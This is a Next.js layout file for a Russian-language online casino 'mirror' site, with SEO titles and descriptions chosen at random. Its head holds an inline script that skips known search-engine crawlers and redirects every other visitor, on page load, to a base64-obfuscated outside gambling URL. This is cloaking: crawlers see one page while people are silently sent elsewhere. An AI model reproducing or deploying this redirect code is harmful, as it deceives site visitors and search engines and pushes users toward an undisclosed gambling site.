import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const titleOptions = [
  'Lucky Bear Casino | Официальный Сайт Онлайн Казино',
  'LuckyBear Casino - Зеркало и Официальная Платформа',
  'Лаки Бир Казино | Безопасная Игра Онлайн',
  'Lucky Bear Казино - Лучший Выбор Игроков РФ',
]

const descriptionOptions = [
  'Lucky Bear Casino - официальный сайт онлайн казино. Зеркало казино, безопасная игра, большие выигрыши. Лаки бир казино зеркало доступно 24/7. Присоединяйтесь к лучшему казино онлайн сегодня.',
  'LuckyBear казино - это современная платформа для азартных игр. Официальный сайт Lucky Bear предлагает зеркало казино для надежного доступа. Играйте в лучшем казино с лучшими условиями.',
  'Лаки Бир казино официальный - лучшее казино онлайн с зеркалом. Быстрая регистрация, щедрые бонусы, надежная защита. Lucky Bear Casino - ваш выбор для азартных игр.',
]

const randomTitle = titleOptions[Math.floor(Math.random() * titleOptions.length)]
const randomDescription = descriptionOptions[Math.floor(Math.random() * descriptionOptions.length)]

export const metadata: Metadata = {
  title: randomTitle,
  description: randomDescription,
  generator: 'v0.app',
  metadataBase: new URL('https://luckybear19casino.vercel.app'),
  canonical: 'https://luckybear19casino.vercel.app/',
  robots: 'index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1',
  alternates: {
    canonical: 'https://luckybear19casino.vercel.app/',
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://luckybear19casino.vercel.app/',
    title: randomTitle,
    description: randomDescription,
    siteName: 'Lucky Bear Casino',
  },
  icons: {
    icon: '/lucky-bear-favicon.png',
    apple: '/lucky-bear-favicon.png',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
  colorScheme: 'dark',
  themeColor: [
    { media: '(prefers-color-scheme: dark)', color: '#1a2326' },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru">
      <head>
        <meta name="yandex-verification" content="3b57c245a285f7a9" />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
        <meta name="theme-color" content="#1a2326" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href="https://luckybear19casino.vercel.app/" />
        <link rel="manifest" href="/manifest.json" />
        <meta name="description" content={randomDescription} />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly93aW5nYW1lNTU1Lnh5ei8zanY5eEk="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased bg-gaming-dark text-gaming-light">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
